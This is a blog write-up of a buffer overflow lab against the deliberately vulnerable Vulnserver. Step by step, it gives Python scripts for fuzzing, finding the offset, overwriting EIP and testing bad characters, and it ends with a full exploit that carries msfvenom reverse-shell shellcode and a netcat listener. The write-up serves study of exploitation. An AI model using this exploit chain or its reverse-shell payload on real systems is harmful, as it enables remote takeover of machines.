---
title: Buffer overflows
author: Cerbersec
layout: post
---

Today I take a look at the [Buffer Overflows Made Easy](https://www.youtube.com/watch?v=qSnPayW6F7U&list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G) course by [The Cyber Mentor](https://www.youtube.com/channel/UC0ArlFuFYMpEewyRBzdLHiw).

<h2>Anatomy of Memory</h2>
Virtual memory consists of kernel-space, user-space and the MBR/BIOS. Kernel-space can access user-space, user-space cannot access kernel-space, this would result in a SEGFAULT.
Each process has a segment in memory, processes related to the correct functionality of the Operating System will run in Kernel-mode, other generic software and applications will run in user-mode.

Upon creation of a process, the OS will allocate and assign a **Heap** to the process. The heap is memory set asside for dynamic allocation. There is no pattern to allocate or deallocate blocks, and you can do so at any time. The heap is typically reclaimed at process exit. The size of the heap is determined at process creation and can grow if needed.

Each thread of a process gets a **stack**. The stack is memory set asside for static allocation, the size of the stack is set when the thread is created and cannot grow. The stack is reclaimed when the thread exits.

![anatomy of memory](/assets/images/bof-anatomy-of-memory.jpg)

<h2>Anatomy of The Stack</h2>
The stack is created with an actual stack data structure, it starts with a high address (eg. `0xffffffff`) and grows to a lower address (eg. `0x00000000`) and works according to the Last In First Out (LIFO) principle. Because of this, it is easy to allocate and deallocate blocks on the stack, using a stack pointer (SP). The stack pointer is stored in a special register on the CPU called ESP (extended stack pointer) and initially points to the top of the stack (the highest address on the stack).

Registers:
* ESP: extended stack pointer: points at the top of the stack
* EBP: extended base pointer: points at the base of the stack
* EIP: extended instruction pointer: contains the address of the next instruction to be executed
* EAX: accumulator register: often contains return value
* EBX: base register: used as base pointer for memory addresses
* ECX: counter register: used as loop counter
* EDX: data register: used for I/O, arithmetic, some interrupt calls
* EDI: destination index register: used for string, memory array copying and setting
* ESI: source index register: used for string, memory array copying
* CS: code segment
* DS: data segment
* SS: stack segement: stores start address of the stack

By overflowing the stack bufferspace, it is possible to overwrite the EBP and reach the EIP. Since the EIP points to the next instuction to execute, modifying it can result in running arbitrary code.

![the stack](/assets/images/bof-stack.png)

<h2>32bit Buffer Overflow</h2>
<h3>Spiking</h3>
Spiking is the process of finding out if something is vulnerable to a BOF. This can be done in multiple ways, most commonly by sending large amounts of data.
I will spike [Vulnserver](http://www.thegreycorner.com/p/vulnserver.html)'s `TRUN` command using `generic_send_tcp` and monitor the process with [Immunity Debugger](https://debugger.immunityinc.com/).

The spike script: trun.spk
~~~
s_readline();
s_string("TRUN ");
s_string_variable("0");
~~~

![spiking with generic_send_tcp](/assets/images/bof-spike.png)

The `TRUN` command is vulnerable to a bufferoverflow and the ESP, EBP and EIP have successfully been overwritten with 'A' or '0x41'.

![vulnserver bof](/assets/images/bof-vulnserver.png)

<h3>Fuzzing</h3>
Fuzzing is used to determine when the target program breaks. I will use a python2 script to repeatedly send an increasing buffer until the target crashes.

fuzz.py
~~~python
#!/usr/bin/python

import sys, socket

buffer = "A" * 100

while True:
        try:
                s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('10.0.0.101',9999))

                s.send(('TRUN /.:/' + buffer))
                s.close()
                buffer = buffer + "A" * 100
        except:
                print("Fuzzing crashed at %s bytes" % str(len(buffer)))
                sys.exit()
~~~

From the output I can tell the target crashed roughly around 2900 bytes.

![bof fuzz](/assets/images/bof-fuzz.png)

<h3>Finding the offset</h3>
Before I can overwrite the EIP, I need to find the offset. To do this, I will use Metasploit's `pattern_create`. The `-l` switch will tell pattern_create to use a length of 3500 bytes, as the target crashed roughly around 2900 bytes.

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3500`

![bof pattern](/assets/images/bof-pattern.png)

Next I'll use a modified version of my fuzzing script

offset.py
~~~python
#!/usr/bin/python

import sys, socket

offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em"

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('10.0.0.101',9999))
        s.send(('TRUN /.:/' + offset))
        s.close()
except:
        print("Error connecting to server")
        sys.exit()
~~~

I have successfully overwritten EIP with the following value: `0x386F4337`.

![bof offset](/assets/images/bof-offset.png)

Now to find the offset I'll use another Metasploit tool `pattern_offset`. I'll specify the value in EIP with the `-q` switch.

`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3500 -q 386F4337`

Metasploit finds an exact match at offset 2003.

![bof offset match](/assets/images/bof-offset-match.png)

<h3>Overwriting EIP</h3>
Now that I have the offset, I can try and control EIP. I'll use a modified version of the offset.py script to set EIP equal to `0x42424242` or `BBBB`.

eip.py
~~~python
#!/usr/bin/python

import sys, socket

offset = "A" * 2003
eip= "B" * 4

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('10.0.0.101',9999))
        s.send(('TRUN /.:/' + offset + eip))
        s.close()
except:
        print("Error connecting to server")
        sys.exit()
~~~

After executing the script, I can see EIP is now equal to `0x42424242` or `BBBB`. I can successfully control EIP.

![controlling eip](/assets/images/bof-eip.png)

<h3>Finding bad characters</h3>
Before generating shellcode, I have to figure out what the bad characters are. This can be done by running all the different hex characters through the program, and seeing which ones act up. By default, the nullbyte `0x00` acts up.

I'll use a modified version of my eip.py script with the badchars variable you can find [here](https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/). Because `0x00` is a bad character by default, I'll remove it from the variable.

badchars.py
~~~python
#!/usr/bin/python

import sys, socket

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

offset = "A" * 2003
eip= "B" * 4

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('10.0.0.101',9999))
        s.send(('TRUN /.:/' + offset + eip + badchars))
        s.close()
except:
        print("Error connecting to server")
        sys.exit()
~~~

After running the script, I'll have to look at the hexdump to identify any out of place characters. starting at `0x01` all the way up to `0xff`. Take note of any missing or out of place characters as they'll mess up the shellcode.

![bof badchars](/assets/images/bof-badchars.png)

<h3>Finding the right module</h3>
I am looking for a DLL or similar module in a program that has no memory protection. Memory protection techniques include:

* Data Execution Prevention (DEP)
* Address Space Layout Randomization (ASLR)
* Safe Structured Exception Handler (SafeSEH)
* Structured Exception Handling Overwrite Protection (SEHOP)

I will use [Mona modules](https://github.com/corelan/mona) together with Immunity Debugger to find an unprotected module.
To install, copy `mona.py` to `C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands`
In Immunity Debugger, run the `!mona modules` command.

Looking at the output, **essfunc.dll** seems to be a good candidate.
`0BADF00D 0x62500000 | 0x62508000 | 0x00008000 | False  | False   | False |  False   | False  | -1.0- [essfunc.dll] (C:\Users\Cerbersec\Desktop\vulnserver\essfunc.dll)`

![mona modules](/assets/images/bof-mona-modules.png)

Next up I'll have to find the opcode equivalent of a JMP ESP instruction. I'll use `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` to spawn nasm_shell and type `JMP ESP`.

![JMP ESP](/assets/images/bof-jmp-esp.png)

Back in Immunity Debugger I can use `!mona find -s "\xff\xe4" -m essfunc.dll` to find return addresses.

![return addresses](/assets/images/bof-return-addresses.png)

I'll will modify my badchars.py script to set EIP equal to the return address. X86 architecture uses little endian, so the bytes are in reverse order.

module.py
~~~python
#!/usr/bin/python

import sys, socket

#address: 625011AF

shellcode = "A" * 2003 + "\xaf\x11\x50\x62"

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('10.0.0.101',9999))
        s.send(('TRUN /.:/' + shellcode))
        s.close()
except:
        print("Error connecting to server")
        sys.exit()
~~~

In Immunity Debugger I'll jump to the `625011AF` address and use **F2** to set a breakpoint.

![breakpoint](/assets/images/bof-breakpoint.png)

After executing `module.py`, Immunity Debugger will hit the breakpoint at `essfunc.625011AF`.

<h3>Generate shellcode</h3>
The final step after controlling EIP and ESP, is generating shellcode. I'll do this with msfvenom, `-p` for payload, `-f` for filetype, `-a` for architecture and `-b` for bad characters.

`msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.100 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`

After generating the shellcode, I'll add it to a modified version of my `module.py` script.

shellcode.py
~~~python
#!/usr/bin/python

import sys, socket

#address: 625011AF

overflow= ("\xd9\xec\xb8\x23\x7d\x26\xc9\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
"\x52\x31\x45\x17\x03\x45\x17\x83\xce\x81\xc4\x3c\xec\x92\x8b"
"\xbf\x0c\x63\xec\x36\xe9\x52\x2c\x2c\x7a\xc4\x9c\x26\x2e\xe9"
"\x57\x6a\xda\x7a\x15\xa3\xed\xcb\x90\x95\xc0\xcc\x89\xe6\x43"
"\x4f\xd0\x3a\xa3\x6e\x1b\x4f\xa2\xb7\x46\xa2\xf6\x60\x0c\x11"
"\xe6\x05\x58\xaa\x8d\x56\x4c\xaa\x72\x2e\x6f\x9b\x25\x24\x36"
"\x3b\xc4\xe9\x42\x72\xde\xee\x6f\xcc\x55\xc4\x04\xcf\xbf\x14"
"\xe4\x7c\xfe\x98\x17\x7c\xc7\x1f\xc8\x0b\x31\x5c\x75\x0c\x86"
"\x1e\xa1\x99\x1c\xb8\x22\x39\xf8\x38\xe6\xdc\x8b\x37\x43\xaa"
"\xd3\x5b\x52\x7f\x68\x67\xdf\x7e\xbe\xe1\x9b\xa4\x1a\xa9\x78"
"\xc4\x3b\x17\x2e\xf9\x5b\xf8\x8f\x5f\x10\x15\xdb\xed\x7b\x72"
"\x28\xdc\x83\x82\x26\x57\xf0\xb0\xe9\xc3\x9e\xf8\x62\xca\x59"
"\xfe\x58\xaa\xf5\x01\x63\xcb\xdc\xc5\x37\x9b\x76\xef\x37\x70"
"\x86\x10\xe2\xd7\xd6\xbe\x5d\x98\x86\x7e\x0e\x70\xcc\x70\x71"
"\x60\xef\x5a\x1a\x0b\x0a\x0d\x2f\xcc\x14\xa9\x47\xce\x14\x20"
"\xc4\x47\xf2\x28\xe4\x01\xad\xc4\x9d\x0b\x25\x74\x61\x86\x40"
"\xb6\xe9\x25\xb5\x79\x1a\x43\xa5\xee\xea\x1e\x97\xb9\xf5\xb4"
"\xbf\x26\x67\x53\x3f\x20\x94\xcc\x68\x65\x6a\x05\xfc\x9b\xd5"
"\xbf\xe2\x61\x83\xf8\xa6\xbd\x70\x06\x27\x33\xcc\x2c\x37\x8d"
"\xcd\x68\x63\x41\x98\x26\xdd\x27\x72\x89\xb7\xf1\x29\x43\x5f"
"\x87\x01\x54\x19\x88\x4f\x22\xc5\x39\x26\x73\xfa\xf6\xae\x73"
"\x83\xea\x4e\x7b\x5e\xaf\x6f\x9e\x4a\xda\x07\x07\x1f\x67\x4a"
"\xb8\xca\xa4\x73\x3b\xfe\x54\x80\x23\x8b\x51\xcc\xe3\x60\x28"
"\x5d\x86\x86\x9f\x5e\x83")


shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('10.0.0.101',9999))
        s.send(('TRUN /.:/' + shellcode + overflow))
        s.close()
except:
        print("Error connecting to server")
        sys.exit()
~~~

Next I'll set up a listener on port 4444 with netcat: `nc -lnvp 4444` and run `shellcode.py`.
I successfully get a reverse shell.

![reverse shell](/assets/images/bof-shell.png)
